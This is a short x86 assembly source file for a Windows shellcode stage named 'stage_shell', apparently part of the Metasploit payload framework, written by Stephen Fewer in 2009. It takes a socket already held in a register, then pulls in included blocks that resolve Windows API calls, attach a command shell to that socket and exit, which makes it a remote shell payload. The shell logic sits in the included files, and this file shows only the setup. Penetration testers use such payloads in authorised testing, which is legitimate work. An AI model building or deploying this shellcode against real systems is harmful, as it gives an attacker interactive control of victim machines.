;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Version: 1.0 (28 July 2009)
; Size: 240 bytes
; Build: >build.py stage_shell
;-----------------------------------------------------------------------------;
[BITS 32]
[ORG 0]

; By here EDI will be our socket and EBP will be the address of 'api_call' from stage 1.
; We reset EBP to the address of 'api_call' as found in this blob to avoid any problems
; if the old stage 1 location gets munged.

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "./src/block/block_api.asm"
start:                   ;
  pop ebp                ; Pop off the address of 'api_call' for calling later.
%include "./src/block/block_shell.asm"
  ; Perform the call to our EXITFUNC.
%include "./src/block/block_exitfunk.asm"